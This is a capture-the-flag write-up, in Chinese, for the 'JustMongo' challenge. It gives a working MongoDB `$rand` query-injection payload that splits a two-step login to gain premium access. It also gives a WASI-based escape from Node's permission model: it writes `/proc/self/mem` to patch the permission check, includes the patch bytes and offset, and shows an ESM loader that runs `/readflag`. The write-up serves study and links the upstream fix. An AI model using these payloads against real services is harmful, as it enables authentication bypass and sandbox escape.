# JustMongo

## 题目简述

题目是 Node.js 20.14.0、MongoDB 与在线 ESM 代码执行服务。普通用户不能使用 `/api/run`，只有 `premium` 会话可以；代码执行进程又启用了 `--experimental-permission`，正常文件和子进程能力受到限制。

利用分为两段：

1. 向 `findOne()` 注入带 `$rand` 的 Mongo 查询，使登录过程的两次查询返回不同用户，获得管理员的 premium 权限；
2. 利用当时 Node.js 权限模型没有覆盖 WASI 文件操作的缺陷，写 `/proc/self/mem`，把权限检查函数改成恒真，再执行 `/readflag`。

## 解题过程

### 取得源码并审计双重查询

题目存在任意文件下载，可先取回服务的 `index.mjs`。登录流程没有固定读取一次用户对象，而是先查询一次验证密码，之后又查询一次读取套餐。用户提供的查询对象被原样交给 MongoDB `findOne()`。

先注册：

```text
username = test
password = 12345678
```

登录时把用户名字段替换成依赖 `$rand` 的表达式：

```json
{
  "$expr": {
    "$eq": [
      "$username",
      {
        "$cond": [
          {"$gt": [{"$rand": {}}, 0.4]},
          "admin",
          "test"
        ]
      }
    ]
  },
  "password": "12345678"
}
```

同一个查询每次执行都会重新计算 `$rand`。理想的一次请求中：

- 第一次 `findOne()` 返回 `test`，已知密码校验通过；
- 第二次 `findOne()` 返回 `admin`，会话中的 plan 被写成 `premium`。

这个组合有稳定的非零概率，循环登录并用 `/api/session` 检查 plan，直到获得 premium token。

### 用 WASI 绕过权限模型

premium 用户可以提交 ESM，由 Node 以实验性权限模型运行。普通 `fs` 和 `child_process` 调用会被拒绝，但该版本的 WASI `path_open`、`fd_seek`、`fd_write` 路径尚未接入同一权限校验。

编译一个 `wasm32-wasi` 模块，预打开 `/`，在模块内执行：

1. `path_open` 以读写方式打开 `/proc/self/mem`；
2. `fd_seek` 定位到 Node 可执行文件内的 `is_scope_granted`；
3. 写入 6 字节机器码 `b8 01 00 00 00 c3`；
4. 关闭文件并返回 JavaScript。

这 6 字节对应：

```asm
mov eax, 1
ret
```

题目提供的 Node 二进制没有 PIE，公开解法对应偏移为 `0x00e0ed57`。该偏移只适用于题目指定版本，复现时应从同版本二进制定位函数，不能移植到其他 Node 构建。

ESM 载荷的骨架如下：

```javascript
import { WASI } from "node:wasi";
import { execSync } from "node:child_process";

export async function main() {
  const wasi = new WASI({
    version: "preview1",
    args: ["patch"],
    env: {},
    preopens: { "/": "/" }
  });

  const module = await WebAssembly.compile(
    Buffer.from(WASM_HEX, "hex")
  );
  const instance = await WebAssembly.instantiate(
    module, wasi.getImportObject()
  );
  wasi.start(instance);

  return execSync("/readflag").toString();
}
```

WASM 返回后，进程内的权限检查已经恒为允许，正常的 `execSync("/readflag")` 即可执行并把 flag 作为 `/api/run` 结果返回。

[Node.js 修复提交](https://github.com/nodejs/node/commit/3ab0499d434078676261512a67897f4c2f433e43)说明了 WASI 执行路径需要纳入权限控制；[R3CTF JustMongo Writeup](https://cf.mnihyc.com/blog/archives/1814)提供了题目版本的 WASI 模块与完整请求脚本。本文已概括两个外链中与复现直接相关的漏洞成因、补丁位置和载荷流程。

## 方法总结

Mongo 注入部分利用的不是传统“查询恒真”，而是同一不确定查询被执行两次却被当作同一身份。认证流程必须在一次确定的用户查询结果上完成密码与授权判断。沙箱部分则体现了权限模型覆盖面的重要性：只要 WASI、Inspector、Worker 等任一执行子系统没有复用统一检查，表面的 API 白名单就可能失效。写 `/proc/self/mem` 的固定偏移是实例细节，真正可迁移的原语是“未受限 WASI 文件写 + 非 PIE 权限检查函数”。
